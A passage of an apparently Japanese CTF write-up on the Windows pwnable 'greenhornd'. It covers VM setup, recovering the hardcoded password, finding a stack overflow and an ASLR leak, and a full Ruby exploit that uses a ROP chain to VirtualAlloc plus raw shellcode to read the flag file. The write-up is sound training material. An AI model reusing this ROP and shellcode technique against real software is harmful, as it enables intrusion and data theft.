&lt;li&gt;greenhornd を実行しようとすると「msvcr120.dll」が無いためにエラーになるのでインストールする&lt;/li&gt;
&lt;li&gt;ちなみにmsvcr120.dll は、libcに入っているような標準的な関数を提供するDLL&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://visualstudio.microsoft.com/ja/downloads/?rr=https%3A%2F%2Fdocs.microsoft.com%2Fja-jp%2Fvisualstudio%2Finstall%2Finstall-visual-studio%3Fview%3Dvs-2019&#34;&gt;Visual Studio 2019&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;PoC 作成用に利用&lt;/li&gt;
&lt;li&gt;特に個別パッケージのMSVC vXXX - VS 2019 C++ x64/x86 build tools には、cl や dumpbin など便利なコマンドが多いのでインストール推奨&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://x64dbg.com/#start&#34;&gt;x64dbg&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Windows における代表的なデバッガの1つ&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.winitor.com/get.html&#34;&gt;PeStudio&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;PEビューワ、マルウェア解析などでも必須となるアイテム&lt;/li&gt;
&lt;li&gt;でかいファイルを扱うと重い&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.nirsoft.net/utils/dll_export_viewer.html&#34;&gt;DLL Export Viewer&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;DLL がExplortする関数一覧の閲覧や検索ができるGUIソフト&lt;/li&gt;
&lt;li&gt;比較的大きなDLLでもさばけるためDLLから関数を探す時などはこちらを利用&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/download-the-wdk&#34;&gt;cdb, Windbgなどのデバッグツール&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;シェルコードのデバッグやPoC 用に利用&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ホスト側には概ね以下のソフトウェアが入っていれば良いだろう。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;exploit コードを作成するためのプログラミング環境 (Python, Rubyなど)&lt;/li&gt;
&lt;li&gt;rp++ などのROP Gadget 検索ツール&lt;/li&gt;
&lt;li&gt;IDA, Ghidra などの逆アセンブラ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;必要なソフトウェアのインストールなどが終わったら次に実際に&lt;code&gt;greenhornd.exe&lt;/code&gt; を問題のように動作させてみる。動作させる際には前述した&lt;code&gt;AppJailLauncher.exe&lt;/code&gt; を利用する。デスクトップなどに、以下の内容の&lt;code&gt;run.bat&lt;/code&gt; を作成する。これでダブルクリックでいつでも問題を動作させることができる。また、同じディレクトリに&lt;code&gt;greenhornd.exe&lt;/code&gt; と&lt;code&gt;key&lt;/code&gt; というファイル名でFLAGを書いたテキストファイルを用意しておこう。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;AppJailLauncher.exe /network /key:key /port:9998 /timeout:30 greenhornd.exe&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;実際にダブルクリックすると以下のような画面になる。その後、ホストマシンから、本VMの9998番ポートへ向けて接続してみよう。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;nc &amp;lt;VMのIPアドレス&amp;gt; 9998&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;正しく動作していれば、Passsword を求められる文字列が帰ってくるはずだ。ここまでが設定できれば、あとは解析をスタートさせることができる。&lt;/p&gt;

&lt;h2 id=&#34;2-解析&#34;&gt;2. 解析&lt;/h2&gt;

&lt;p&gt;まずは、先程nc でつないだところからのスタートだ。パスワードの入力を求められているので、バイナリ中からパスワードを探そう。この時重要なのは、本問題はPwnableであってReversingではない。つまり、難しい技を使ってパスワードを隠していることは考えにくい。そこで、手始めにstrings コマンドとgrep でpasswordを引っ掛けてみよう。grep で検索をかける際には、大文字小文字を無視する-i オプションを付けておくと良い。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;strings greenhornd.exe | grep -i password
To continue, you&amp;#39;re going to need the password. You can get the password by running strings from minsys (strings - greenhorn.exe) or locate it in IDA.
Password: 
GreenhornSecretPassword!!!
Incorrect Password.
Password accepted.&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この結果から、気になる文章はあるものの、&lt;code&gt;GreenhornSecretPassword!!!&lt;/code&gt; が怪しいと感じるだろう。nc でつないで、この文字列を入力してみよう。そうすると、さらに応答が進み選択画面が出てくるはずだ。割愛するが、重要な選択肢は、(A)と(V)だ。(A) を選ぶと、PEファイルのベースアドレスとスタックのアドレスがリークする。つまり、Windows におけるASLRをBypassすることが可能となる。(V) を選択すると1024 byteの入力を行うことができる。この2つ以外はどれも説明の文字列が帰ってくるだけだ。&lt;/p&gt;

&lt;p&gt;今回は、Ghidra を用いて逆アセンブル、逆コンパイル結果を見ながら詳細な解析を勧めていく。PeStudioなどの.textセクションのvirtual address や文字列などを起点にxref機能などを使ってバイナリ中を動き回ると、&lt;code&gt;0x401000&lt;/code&gt; がmain関数にあたる部分だとわかる。さらに、下図からも先程入力したパスワードがstrncmp関数で比較されており正しいことがわかる。解析する際には、積極的に関数名や変数名をわかりやすい形に変更していくことをおすすめする。Ghidra はまだ世に出て慣れ親しんでいない人も多いので、&lt;a href=&#34;https://booth.pm/ja/items/1575255&#34;&gt;Ghidra Pro Book&lt;/a&gt; を一読することをおすすめする。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://imgur.com/download/UIkarAm&#34; alt=&#34;main関数付近のデコンパイル画面&#34; /&gt;&lt;/p&gt;

&lt;p&gt;さらにswitch 文のところから、(V)の処理の実際の関数は、&lt;code&gt;0x401210&lt;/code&gt;だとわかるので見てみる。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://imgur.com/download/sNFqhmW&#34; alt=&#34;選択肢Vの関数&#34; /&gt;&lt;/p&gt;

&lt;p&gt;中では、0x800 という引数があることがわかる。読み込む処理が本処理しかないため、この値は読み込みバイト数だと推測できるが、促されている長さは1024なためBuffer Overflow が発生するとわかる。さらに条件分岐で、&lt;code&gt;C&lt;/code&gt; の文字が先頭に入っているとexit処理に移る。実際にデバッガでこの周辺処理や1024文字以上を入力した場合の挙動を見てみると、ebpレジスタが指すアドレスの次のワードがreturn address になっていることがわかる。今回の場合、return address が格納されたアドレスが&lt;code&gt;0x03CFAC0&lt;/code&gt; 、入力するバッファの先頭アドレスが&lt;code&gt;0x03CF6C0&lt;/code&gt; だったので、先頭から1028byte分のパディングをした後に、return address を書き換えることが可能だとわかる。これで、EIPは奪えたことになる。(こういった動的なデバッグの際には、攻撃コードを送る手前で、exploitコード側で標準入力を受け付けておき、デバッガで対象プロセスにアタッチし、ブレークポイントを貼って、exploitコードで適当なキーを叩き実行を進めて止めるやり方が便利。)&lt;/p&gt;

&lt;p&gt;ここまでの情報を整理すると、以下のようになる。これらを踏まえてExploit 作成に移る。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;1028 バイトのパディングを入れることで、Return address を書き換えることができる&lt;/li&gt;
&lt;li&gt;PEのベースアドレスとスタックのアドレスは、リーク可能&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;3-exloit-コードの作成&#34;&gt;3. Exloit コードの作成&lt;/h2&gt;

&lt;p&gt;まずは、Exploit の方針を明示する。今回は、VirtualAlloc関数を使って、スタックの領域をRWXな領域に変更し、シェルコードを実行して、keyファイルの内容を出力する方針を取る。VirtualAlloc関数の実アドレスは、0x402000(RVA) に存在するため、ROPで本アドレスの中にあるアドレスにジャンプすることを試みる。本コードには、switch文があり、&lt;code&gt;dword[ecx*4+0x401160]&lt;/code&gt; にjmpする処理が存在する。そのため、ecxを適切な値にしてこのjmp処理に制御を移すことで任意のアドレスにjmpすることができる。そこで、バイナリ中に&lt;code&gt;pop ecx; ret&lt;/code&gt; が行えるROP Gadgetがあるか調べると、いくつかGadget が見つかるため、本方針でVirtualAlloc関数に飛ばすことは可能だと考えられる。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ rp-osx-x64 -r &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt; -f greenhornd.exe | grep &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pop ecx&amp;#39;&lt;/span&gt;
0x0040178c: pop ecx ; ret  ;  &lt;span style=&#34;color:#666&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt; found&lt;span style=&#34;color:#666&#34;&gt;)&lt;/span&gt;
0x004018b5: pop ecx ; ret  ;  &lt;span style=&#34;color:#666&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt; found&lt;span style=&#34;color:#666&#34;&gt;)&lt;/span&gt;
0x00401c20: pop ecx ; ret  ;  &lt;span style=&#34;color:#666&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt; found&lt;span style=&#34;color:#666&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;次に、VirtualAllocでスタックのパーミッションを書き換えた後に実行するシェルコードについて考えてみる。Linux と異なりWindows の場合システムコール番号などが各種OSで異なっておりLinux に比べて生のシステムコールを読ぶのは汎用性が低いシェルコードになってしまう。そのため、Windowsの場合はWin32 APIを呼び出して実行するシェルコードを作成する。今回は、&lt;code&gt;key&lt;/code&gt; というファイルの中身を見たいので、ファイルを開いて、読み出し、書き出す処理を行う必要がある。そこで、PEバイナリに含まれているReadFileやWriteFileを用いれば良いと考えられるが、これらの関数を実行するためには事前に対象ファイルのファイルハンドラを取得する必要があり、そのためには引数の多いCreateFile関数を呼ばなくてはならない。今回の場合は特に成約が厳しくないが、長さ制限などがある場合は、&lt;code&gt;_open&lt;/code&gt;, &lt;code&gt;_read&lt;/code&gt;, &lt;code&gt;_write&lt;/code&gt; を使ってLinuxライクなシェルコードを作成して短くする方法がある。今回は、その方針で作成した。Windows におけるシェルコード作成方法などについては、&lt;a href=&#34;http://inaz2.hatenablog.com/entry/2015/04/23/013858&#34;&gt;Windowsで電卓を起動するシェルコードを書いてみる&lt;/a&gt; がとてもわかりやすいので参照してほしい。今回は、本サイトのシェルコードを改変する形で以下のシェルコードを作成した。mainラベルより上はサイトと全く同じため省略する。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span style=&#34;color:#a0a000&#34;&gt;main:&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0079656&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;bh&lt;/span&gt;	&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; key
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;eax&lt;/span&gt;, &lt;span style=&#34;color:#800&#34;&gt;esp&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;eax&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;e12e0c6eh&lt;/span&gt;  	&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; open(&amp;#34;key&amp;#34;, 0, 0)
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;api_call&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebx&lt;/span&gt;, &lt;span style=&#34;color:#800&#34;&gt;eax&lt;/span&gt;        &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; ファイルディスクリプタをebxに退避
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;h&lt;/span&gt;		    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; len
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;lea&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebp&lt;/span&gt;, [&lt;span style=&#34;color:#800&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;h&lt;/span&gt;]	&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; buffer
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebp&lt;/span&gt;            
    &lt;span style=&#34;color:#800&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebx&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;e70e09a4h&lt;/span&gt;	    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; read(fd, esp+100h, 100h)
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;api_call&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;h&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ebp&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;067&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;a78ad5h&lt;/span&gt;	    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; write(fd, esp+100h, 100h)
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;api_call&lt;/span&gt;
    &lt;span style=&#34;color:#00f&#34;&gt;push&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;e2d87eh&lt;/span&gt;      &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;; ExitProcess
&lt;/span&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#800&#34;&gt;call&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;api_call&lt;/span&gt;

&lt;span style=&#34;color:#00f&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;start&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最後に、以下にexploit の全体コードを示す。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: ascii-8bit&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;

host &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;192.168.0.109&amp;#39;&lt;/span&gt;
port &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;9998&lt;/span&gt;
$z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new host, port
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;z&lt;/span&gt;; $z; &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:info&lt;/span&gt;

password &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;GreenhornSecretPassword!!!&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Password: &lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;password&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Password: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline password
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Selection: &amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[*] Select A to leak and calculate some addresses&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;
tmp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Selection: &amp;#34;&lt;/span&gt;
text_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; tmp&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/is: (.*) /&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
stack_addr &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; tmp&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/at: (.*)\./&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
pop_ecx_ret &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; text_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x0040178c&lt;/span&gt;
jmp_memory &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; text_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x0040110d&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;image base address        : 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% text_base
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Stack address             : 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% stack_addr
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;pop ecx; ret              @ 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% pop_ecx_ret
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;jmp dword[0x401160+ecx*4] @ 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% jmp_memory
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[*] Select V to overflow&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;V&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;).&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;

shellcode &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\xFC\xEB\x67\x60\x33\xC0\x64\x8B\x40\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x89\x44\x24\x1C\x8B\x68\x10\x8B\x45\x3C\x8B\x54\x05\x78\x03\xD5\x8B\x4A\x18\x8B\x5A\x20\x03\xDD\xE3\x39\x49\x8B\x34\x8B\x03\xF5\x33\xFF\x33\xC0\xAC\x84\xC0\x74\x07\xC1\xCF\x0D\x03\xF8\xEB\xF4\x3B\x7C\x24\x24\x75\xE2\x8B\x5A\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5A\x1C\x03\xDD\x8B\x04\x8B\x03\xC5\x89\x44\x24\x1C\x61\x59\x5A\x51\xFF\xE0\x8B\x74\x24\x1C\xEB\xA6\x68\x6B\x65\x79\x00\x8B\xC4\x6A\x00\x6A\x00\x50\x68\x6E\x0C\x2E\xE1\xE8\x83\xFF\xFF\xFF\x8B\xD8\x68\x00\x01\x00\x00\x8D\xAC\x24\x00\x01\x00\x00\x55\x53\x68\xA4\x09\x0E\xE7\xE8\x69\xFF\xFF\xFF\x68\x00\x01\x00\x00\x55\x6A\x01\x68\xD5\x8A\xA7\x67\xE8\x57\xFF\xFF\xFF\x68\x7E\xD8\xE2\x73\xE8\x4D\xFF\xFF\xFF\x00\x00\x00\x00\x6E\x8F\x87\x5D\x00\x00\x00\x00\x0D\x00\x00\x00\x40\x00\x00\x00\x1C\x20\x00\x00\x1C\x04\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\xB6\x00\x00\x00\x2E\x74\x65\x78\x74\x24\x6D\x6E\x00\x00\x00\x00\x00\x20\x00\x00\x1C\x00\x00\x00\x2E\x72\x64\x61\x74\x61\x00\x00\x1C\x20\x00\x00\x50\x00\x00\x00\x2E\x72\x64\x61\x74\x61\x24\x7A\x7A\x7A\x64\x62\x67\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;C&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1028&lt;/span&gt;          &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# 1028 byte&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(pop_ecx_ret)   &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Overwrite return address&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;936&lt;/span&gt;)           &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# ecx &amp;lt;- 936&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(jmp_memory)    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# jmp dword [0x401160+ecx*4] -&amp;gt; 0x402000 (VirtualAlloc)&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(stack_addr&lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;44&lt;/span&gt;) &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# the head address of shellcode&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(stack_addr)    &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# lpAddress&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;1024&lt;/span&gt;)          &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# dwSize = 1024&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;0x1000&lt;/span&gt;)        &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# flAllocationType = MEM_WRITE&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;0x40&lt;/span&gt;)          &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# flProtect = PAGE_EXECUTE_READWRITE&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; shellcode
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;[*] Send payload&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;以下が実行結果である。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://imgur.com/download/U7pR2SU&#34; alt=&#34;x.rbの実行結果&#34; /&gt;&lt;/p&gt;

